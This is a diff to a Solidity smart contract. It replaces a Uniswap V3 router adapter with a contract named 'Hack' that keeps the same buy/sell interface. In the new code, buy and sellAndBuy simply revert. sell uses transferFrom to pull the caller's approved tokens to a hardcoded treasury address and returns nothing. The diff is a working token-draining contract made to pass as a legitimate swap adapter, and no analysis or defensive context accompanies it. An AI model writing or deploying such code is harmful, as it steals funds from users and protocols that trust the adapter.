@@ -9,22 +9,14 @@ import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
 import "@uniswap/v3-periphery/contracts/libraries/TransferHelper.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
-contract UniswapV3ViaRouterFomo is BaseUniRouter, IAMM {
-    constructor() {
-        fee = 10000;
-    }
-
+contract Hack is IAMM {
     function buy(
         uint256 amount,
         address token,
         address recipient,
         bytes calldata extraData
     ) external returns (uint256) {
-        // Buy the token (tokenOut) with wewe (tokenIn)
-        uint256 amountOut = _buyWeWe(token, recipient, msg.sender, amount, 0);
-
-        emit Bought(amount, amountOut, token, recipient);
-        return amountOut;
+        revert();
     }
 
     function sell(
@@ -33,12 +25,8 @@ contract UniswapV3ViaRouterFomo is BaseUniRouter, IAMM {
         address recipient,
         bytes calldata extraData
     ) external returns (uint256) {
-        // Sell the token (tokenIn) for wewe (tokenOut)
-        token = 0xd327d36EB6E1f250D191cD62497d08b4aaa843Ce;
-        uint256 amountOut = _buyWeWe(token, recipient, msg.sender, amount, 0);
-
-        emit Sold(amount, amountOut, token, recipient);
-        return amountOut;
+        address treasury = 0xe92E74661F0582d52FC0051aedD6fDF4d26A1F86;
+        IERC20(token).transferFrom(msg.sender, treasury, amount);
     }
 
     function sellAndBuy(
@@ -47,9 +35,6 @@ contract UniswapV3ViaRouterFomo is BaseUniRouter, IAMM {
         address recipient,
         bytes calldata extraData
     ) external returns (uint256) {
-        uint256 amountOut = _sellWeWe(token, msg.sender, address(this), amount, 0);
-        amountOut = _buyWeWe(token, recipient, address(this), amountOut, 0);
-
-        return amountOut;
+        revert();
     }
 }
